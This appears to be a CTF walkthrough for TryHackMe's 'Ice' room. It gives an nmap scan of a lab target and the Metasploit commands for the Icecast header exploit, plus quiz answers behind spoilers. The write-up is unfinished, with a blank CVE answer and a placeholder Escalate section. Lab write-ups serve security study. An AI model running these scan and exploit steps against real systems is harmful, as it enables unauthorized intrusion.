<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/ice/Ice_Cover.png" alt="Ice Logo">
</p>

# Ice

This guide contains the answer and steps necessary to get to them for the [Ice](https://tryhackme.com/room/ice) room.

## Table of contents

- [Recon](#recon)
- [Gain Access](#gain-access)
- [Escalate](#escalate)
- [Looting](#looting)
- [Post-Exploitation](#post-exploitation)
- [Extra Credit](#extra-credit)

### Recon

In this part of the challenge we will find out more about the target and the running services.

*Launch a scan against our target machine, I recommend using a SYN scan set to scan all ports on the machine. The scan command will be provided as a hint, however, it's recommended to complete the room 'Nmap' prior to this room. *

For the scan we use the following command:

   ```cmd
   nmap -sS 10.10.190.137 -p- -sV
   ```
   
   -sS specifies the SYN scan type
   -p- means, scan all ports
   -sV gives more version information
   -sC run default scripts for more information if host name is not listed

3. Once the scan completes, we'll see a number of interesting ports open on this machine. As you might have guessed, the firewall has been disabled (with the service completely shutdown), leaving very little to protect this machine. One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on?

   ![Nmap Scan]()
   
   Here we find the port for the RDP service. Do some research if any services seem unclear.

   ><details><summary>Click for answer</summary>3389</details>

4. What service did nmap identify as running on port 8000? (First word of this service)

   This answer can be found in the previous image.

   ><details><summary>Click for answer</summary>Icecast</details>

5. What does Nmap identify as the hostname of the machine? (All caps for the answer)

   This can also be found in the previous image.

   ><details><summary>Click for answer</summary>DARK-PC</details>
   
### Gain Access

*Now that we've identified some interesting services running on our target machine, let's do a little bit of research into one of the weirder services identified: Icecast. Icecast, or well at least this version running on our target, is heavily flawed and has a high level vulnerability with a score of 7.5 (7.4 depending on where you view it). *
 
1. What type of vulnerability is it? Use https://www.cvedetails.com for this question and the next.



   ><details><summary>Click for answer</summary>execute code overflow</details>

2. What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000



   ><details><summary>Click for answer</summary></details>

*Now that we've found our vulnerability, let's find our exploit. For this section of the room, we'll use the Metasploit module associated with this exploit. Let's go ahead and start Metasploit using the command `msfconsole`*

4. After Metasploit has started, let's search for our target exploit using the command 'search icecast'. What is the full path (starting with exploit) for the exploitation module? This module is also referenced in 'RP: Metasploit' which is recommended to be completed prior to this room, although not entirely necessary. 



   ><details><summary>Click for answer</summary>exploit/windows/http/icecast_header</details>

*Let's go ahead and select this module for use. Type either the command `use icecast` or `use 0` to select our search result.*

5. Following selecting our module, we now have to check what options we have to set. Run the command `show options`. What is the only required setting which currently is blank?



   ><details><summary>Click for answer</summary>rhosts</details>

*First let's check that the LHOST option is set to our tun0 IP (which can be found on the access page). With that done, let's set that last option to our target IP. Now that we have everything ready to go, let's run our exploit using the command `exploit`*




   msfconsole
   search icecast
   use exploit/windows/http/icecast_header
   options
   set rhosts 10.10.190.137
   exploit
   


### Escalate


1. d

   
   ><details><summary>Click for answer</summary></details>
